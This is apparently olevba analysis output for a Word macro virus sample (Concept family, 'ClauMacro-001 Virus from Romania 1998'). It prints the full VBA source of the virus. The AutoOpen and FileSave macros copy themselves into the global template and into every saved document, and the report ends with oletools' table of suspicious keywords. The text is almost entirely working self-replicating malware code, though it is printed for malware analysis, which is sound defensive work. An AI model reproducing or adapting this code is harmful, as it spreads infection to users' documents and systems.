olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept.dq-89c30825d52191f4fa8eee41090443b6940bbd9a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept.dq-89c30825d52191f4fa8eee41090443b6940bbd9a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Clau.bas 
in file: Virus.MSWord.Concept.dq-89c30825d52191f4fa8eee41090443b6940bbd9a - OLE stream: 'Macros/VBA/Clau'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem Este destul pentru a dovedi...
If WordBasic.Day(WordBasic.Now()) = 1 Then WordBasic.MsgBox "Felicitari! Aveti un Macro Virus!!!", "ClauMacro-001 Virus from Romania 1998", 64
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Concept.dq-89c30825d52191f4fa8eee41090443b6940bbd9a - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cMe$
Dim c2Macro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
cMe$ = WordBasic.[FileName$]()
c2Macro$ = cMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:ClauAO", c2Macro$
c2Macro$ = cMe$ + ":ClauAO"
WordBasic.MacroCopy "Global:ClauAO", c2Macro$
c2Macro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy "Global:ClauFS", c2Macro$
c2Macro$ = cMe$ + ":Clau"
WordBasic.MacroCopy "Global:Clau", c2Macro$
WordBasic.FileSaveAs dlg
WordBasic.Call "Clau"
GoTo done

bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ClauFS.bas 
in file: Virus.MSWord.Concept.dq-89c30825d52191f4fa8eee41090443b6940bbd9a - OLE stream: 'Macros/VBA/ClauFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cMe$
Dim c2Macro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
cMe$ = WordBasic.[FileName$]()
c2Macro$ = cMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:ClauAO", c2Macro$
c2Macro$ = cMe$ + ":ClauAO"
WordBasic.MacroCopy "Global:ClauAO", c2Macro$
c2Macro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy "Global:ClauFS", c2Macro$
c2Macro$ = cMe$ + ":Clau"
WordBasic.MacroCopy "Global:Clau", c2Macro$
WordBasic.FileSaveAs dlg
WordBasic.Call "Clau"
GoTo done

bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ClauAO.bas 
in file: Virus.MSWord.Concept.dq-89c30825d52191f4fa8eee41090443b6940bbd9a - OLE stream: 'Macros/VBA/ClauAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cMe$
Dim cMacro$
On Error GoTo -1: On Error GoTo abort
'add FileSave and copies of AutoOpen and FileSave.
cMe$ = WordBasic.[FileName$]()
cMacro$ = cMe$ + ":Clau"
WordBasic.MacroCopy cMacro$, "Global:Clau"
cMacro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy cMacro$, "Global:FileSave"
cMacro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy cMacro$, "Global:ClauFS"
cMacro$ = cMe$ + ":ClauAO"
WordBasic.MacroCopy cMacro$, "Global:ClauAO"
WordBasic.Call "Clau"
abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
